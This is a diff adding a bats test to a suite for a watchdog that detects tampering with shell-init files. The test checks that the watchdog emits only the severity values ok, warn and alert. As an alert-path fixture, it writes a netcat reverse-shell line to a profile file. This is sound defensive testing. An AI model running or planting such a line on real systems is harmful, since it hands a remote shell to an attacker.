@@ -318,3 +318,25 @@ seed_benign() {
     [ -f "${BASELINE}" ]
     cap | grep -qE '"event":"baseline_initial"'
 }
+
+@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract)" {
+    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
+    # The shell-init-watchdog MUST only emit severity values
+    # from the closed set {ok,warn,alert} — never custom
+    # values (critical, error, fatal, notice, info). Operator
+    # dashboard parsers (alertmanager / log aggregator routes)
+    # branch on the literal severity string; an out-of-set
+    # value silently falls through routing and the operator
+    # never sees the alert. Locks parser contract on the
+    # T1546.004 shell-init detection surface.
+    seed_benign
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # ok path
+    printf '; nc 1.1.1.1 4444 -e /bin/sh\n' > "${PROFILE_F}"
+    run_wd                                              # alert path
+    printf '# benign trailing comment\nexport PATH=/usr/bin:$PATH\n' > "${PROFILE_F}"
+    run_wd                                              # warn path (benign change)
+    # Every severity value emitted MUST be one of {ok,warn,alert}.
+    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
+    [ -z "${bad}" ]
+}
